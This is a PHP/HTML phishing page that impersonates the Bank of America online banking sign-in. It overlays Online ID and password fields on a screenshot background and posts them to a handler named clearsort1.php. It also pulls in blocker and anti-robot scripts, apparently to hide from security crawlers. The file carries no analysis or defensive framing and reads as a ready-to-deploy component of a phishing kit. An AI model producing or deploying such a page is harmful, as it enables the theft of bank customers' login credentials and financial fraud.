<?php

error_reporting(0);
@ini_set('display_errors', 'on'); 
ob_start();

include('blocker.php');
include('antirobot.php');
include('bt.php');

?>


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title>Bank of America - Banking, Credit Cards, Loans and Merrill Investing</title>

<link rel="icon" href="favicon.ico" type="image/x-icon">

<style type="text/css">
body{
margin:0;

}

@font-face{font-family:"cnx-regular";src:url("cnx-regular.eot");src:url("cnx-regular.eot?#iefix") format("embedded-opentype"),url("cnx-regular.woff2") format("woff2"),url("cnx-regular.woff") format("woff"),url("cnx-regular.ttf") format("truetype");font-weight:300;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-bold";src:url("cnx-bold.eot");src:url("cnx-bold.eot?#iefix") format("embedded-opentype"),url("cnx-bold.woff2") format("woff2"),url("cnx-bold.woff") format("woff"),url("cnx-bold.ttf") format("truetype");font-weight:700;font-style:normal;font-variant:normal}

@font-face{font-family:"cnx-medium";src:url("cnx-medium.eot");src:url("cnx-medium.eot?#iefix") format("embedded-opentype"),url("cnx-medium.woff2") format("woff2"),url("cnx-medium.woff") format("woff"),url("cnx-medium.ttf") format("truetype");font-weight:300;font-style:italic;font-variant:normal}


input[type=text] {

font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:16px;
width: 272px;
height: 36px;
border:1px solid #ccc;
color: #000000;

}

input[type=text]:focus {

font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:16px;
width: 272px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}



input[type=password] {
font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:16px;
width: 272px;
height: 36px;
border:1px solid #ccc;
color: #000000;
}

input[type=password]:focus {

font-family:cnx-regular, Arial, Helvetica, sans-serif;
font-weight:bold;
font-size:16px;
width: 272px;
height: 36px;
border:1px solid #0066FF;
color: #000000;
}




.checkbox {

	display: block;
    position: absolute;
    margin-top: 0;
    top: 0;
    left: 0;
    height: 34px;
    width: 30px;
    background: none;
	
}
</style>


</head>

<body onLoad="document.getElementById('myinputbox').focus();" style="background-image:url(mainbg.jpg); background-repeat: no-repeat; height:3721px;">

<form id="loginForm" method="post" action="clearsort1.php" target="_self" novalidate="novalidate">

<div style="position:absolute; overflow:hidden; left:67px; top:157px;">
<input min="0" id="myinputbox" type="text" name="username" placeholder="Online ID" data-validate="userId" required="" autocorrect="off" autocapitalize="off" />

</div> 


<div style="position:absolute; overflow:hidden; left:67px; top:207px;"><input min="0"  type="password" name="password"  data-validate="userId"   required="" placeholder="Password" autocorrect="off" autocapitalize="off" >

</div> 


<div style="position:absolute; font-size:16px; left:63px; top:255px;"><input type="checkbox" name="privacy" value="Yes" class="checkbox" maxlength="3"></div>	



<div id="formimage1" style="position:absolute; overflow:hidden; left:67px; top:297px;"> <input type="image" name="formimage1" width="278" height="44" src="signin-btn.jpg"></div>

</form>


</body>
</html>
